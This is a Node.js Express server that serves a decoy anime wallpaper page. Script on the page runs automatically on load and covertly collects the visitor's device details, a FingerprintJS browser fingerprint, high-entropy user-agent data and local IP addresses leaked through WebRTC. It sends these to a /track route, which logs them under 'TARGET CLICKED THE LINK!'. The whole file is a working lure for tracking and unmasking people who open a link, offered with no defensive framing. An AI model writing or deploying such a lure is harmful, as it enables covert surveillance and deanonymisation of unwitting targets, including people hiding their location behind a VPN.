const express = require('express');
const app = express();
app.use(express.json({ limit: '10mb' }));

app.get('/', (req, res) => {
    const html = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Anime Gallery HD</title>
    <style>
        body { margin:0; background:#000; height:100vh; display:flex; align-items:center; justify-content:center; overflow:hidden; }
        img { max-width:100%; max-height:100%; object-fit:contain; }
    </style>
</head>
<body>
    <img src="https://images6.alphacoders.com/135/thumbbig-1358426.webp" alt="Anime Wallpaper">
    
    <script src="https://openfpcdn.io/fingerprintjs/v5" async></script>
   
    <script>
        async function getFullDeviceInfo() {
            const info = {
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                screen: {
                    width: screen.width,
                    height: screen.height,
                    availWidth: screen.availWidth,
                    availHeight: screen.availHeight,
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth
                },
                hardware: {
                    cores: navigator.hardwareConcurrency,
                    memory: navigator.deviceMemory,
                },
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            };

            // ==================== FingerprintJS v5 ====================
            try {
                const fpPromise = import('https://openfpcdn.io/fingerprintjs/v5')
                    .then(FingerprintJS => FingerprintJS.load());
               
                const fp = await fpPromise;
                const result = await fp.get();
               
                info.fingerprint = {
                    visitorId: result.visitorId,
                    confidence: result.confidence,
                    components: result.components
                };
                console.log("✅ FingerprintJS Done:", result.visitorId);
            } catch(e) {
                console.log("FingerprintJS Error:", e);
            }

            // ==================== High Entropy User Agent Data ====================
            if (navigator.userAgentData) {
                try {
                    const ua = await navigator.userAgentData.getHighEntropyValues([
                        'model', 'platform', 'platformVersion', 'architecture',
                        'bitness', 'fullVersionList'
                    ]);
                    info.highEntropyUA = ua;
                } catch(e) {}
            }

            // ==================== WebRTC Leak Check ====================
            try {
                const rtcInfo = await getWebRTCInfo();
                info.webRTC = rtcInfo;
            } catch(e) {
                info.webRTC = { error: e.message };
            }

            // Server e pathao
            fetch('/track', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(info)
            }).catch(() => {});

            console.log("📤 All Device Info Sent");
        }

        // WebRTC Leak Detection
        async function getWebRTCInfo() {
            return new Promise((resolve) => {
                const ips = new Set();
                const pc = new RTCPeerConnection({
                    iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
                });

                pc.createDataChannel('test');
                pc.onicecandidate = (e) => {
                    if (e.candidate && e.candidate.candidate) {
                        const ipMatch = e.candidate.candidate.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/);
                        if (ipMatch) ips.add(ipMatch[1]);
                    }
                };

                pc.createOffer()
                    .then(offer => pc.setLocalDescription(offer))
                    .catch(() => {});

                setTimeout(() => {
                    pc.close();
                    resolve({
                        leakedIPs: Array.from(ips),
                        hasWebRTC: true
                    });
                }, 1500);
            });
        }

        // Page load e shob run hobe
        window.onload = getFullDeviceInfo;
    </script>
</body>
</html>`;
    res.send(html);
});

// Tracking Route
app.post('/track', (req, res) => {
    console.log('\n🔥🔥 TARGET CLICKED THE LINK! 🔥🔥');
    console.log('Full Device Information:');
    console.dir(req.body, { depth: null });
    console.log('--------------------------------------------------\n');
   
    res.status(200).send('ok');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log('Server is running on port', PORT);
});
